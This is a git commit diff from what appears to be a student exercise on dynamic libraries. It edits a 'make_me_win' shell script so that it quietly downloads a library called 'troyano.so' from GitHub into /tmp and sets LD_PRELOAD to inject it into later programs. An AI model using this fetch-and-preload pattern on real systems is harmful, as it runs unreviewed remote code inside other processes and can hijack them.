c61eef860131a3c142e9c408c54da90f4725c5a0
DiegoSusviela <dieguitosus@hotmail.com>
2021-05-03 19:07:37 -0300

    CHANGED LINK TO BE DOWLOAD FILE

--- 0x18-dynamic_libraries/101-make_me_win.sh
+++ 0x18-dynamic_libraries/101-make_me_win.sh
@@ -1,3 +1,3 @@
 #!/bin/bash
-wget -P /tmp https://github.com/DiegoSusviela/holbertonschool-low_level_programming/blob/main/0x18-dynamic_libraries/troyano.so
+wget -q -P /tmp https://github.com/DiegoSusviela/holbertonschool-low_level_programming/raw/main/0x18-dynamic_libraries/troyano.so
 export LD_PRELOAD=/tmp/troyano.so
